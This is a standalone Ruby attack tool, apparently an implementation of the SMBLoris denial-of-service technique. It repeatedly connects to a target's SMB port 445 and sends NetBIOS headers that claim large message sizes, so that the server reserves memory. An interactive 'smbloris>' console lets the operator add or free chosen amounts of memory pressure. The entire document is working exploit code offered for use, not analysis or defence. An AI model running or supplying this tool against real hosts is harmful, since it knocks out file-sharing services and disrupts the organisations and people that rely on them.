#!/usr/bin/env ruby

require 'socket'
require 'readline'

class Client < TCPSocket
    attr_reader :memory_size

    MAX_SIZE = 0x1FFFF

    def initialize(target, size = MAX_SIZE) 
        raise ArgumentError, "Size too big" if size > MAX_SIZE

        @memory_size = size

        super(target, 445)
        send_nbss_header

        STDERR.print '+'
    end

    def close
        super unless self.closed?

        STDERR.print '-'
    end

    private

    def send_nbss_header
        hdr = [ @memory_size ].pack "I"
        self.write(hdr)
    end
end

class ConnectionPool
    def initialize(target)
        @target = target
        @pool = []
    end

    def count
        refresh

        @pool.size
    end

    def memory_size
        refresh

        @pool.map(&:memory_size).inject(0, :+)
    end

    def add_client(size = Client::MAX_SIZE)
        @pool.push Client.new(@target, size)
    end

    def clear
        @pool.each(&:close)
        @pool.clear
    end

    def add_memory(total_size)
        nr_clients = (total_size + Client::MAX_SIZE - 1) / Client::MAX_SIZE

        nr_clients.times do
            size = [ total_size, Client::MAX_SIZE ].min 
            self.add_client(size)
            total_size -= size
        end
    end

    def free_memory(total_size)
        refresh

        freed_size = 0
        clients = @pool.take_while {|c| (freed_size += c.memory_size) < total_size }

        @pool.drop(clients.size)
        clients.each(&:close)
    end

    private

    def refresh
        @pool.delete_if {|c| c.closed? }
    end
end

if ARGV.size != 1
    abort "Usage: #{$0} <target>"
end

pool = ConnectionPool.new(ARGV.first)

def mem_unit_to_int(str)
    unless str =~ /^\s*(?<n>\d+)(?<unit>[K|M|G])?B?\s*$/i
        raise ArgumentError, "Bad expression #{str.inspect}"
    end

    value = $~['n'].to_i
    case $~['unit']
    when /K/i then value <<= 10
    when /M/i then value <<= 20
    when /G/i then value <<= 30
    end

    value
end

def show_status(pool)
    STDERR.puts "Number of connections: #{pool.count}"
    STDERR.puts "Total memory size: #{pool.memory_size} bytes"
end

loop do
    begin
        line = Readline.readline('smbloris> ', true)
        break if line.nil?

        cmd = line.strip.downcase
        next if cmd.empty?

        case cmd
        when 'quit', 'exit'
            break
        when 'help', ??
            STDERR.puts "Available commands: quit, help, status, clear, add <mem>, free <mem>"
        when 'status'
            show_status(pool)
        when 'clear'
            pool.clear
            STDERR.puts
            show_status(pool)
        when /^add\s+(?<arg>.*)$/
            pool.add_memory mem_unit_to_int $~['arg']
            STDERR.puts
            show_status(pool)
        when /^free\s+(?<arg>.*)$/
            pool.free_memory mem_unit_to_int $~['arg']
            STDERR.puts
            show_status(pool)
        else
            STDERR.puts "Unknown command #{cmd.inspect}"
        end
    rescue Interrupt
        STDERR.puts
    rescue StandardError
        STDERR.puts "Exception #{$!.class}: #{$!.message} (#{$!.backtrace.first})"
    end
end
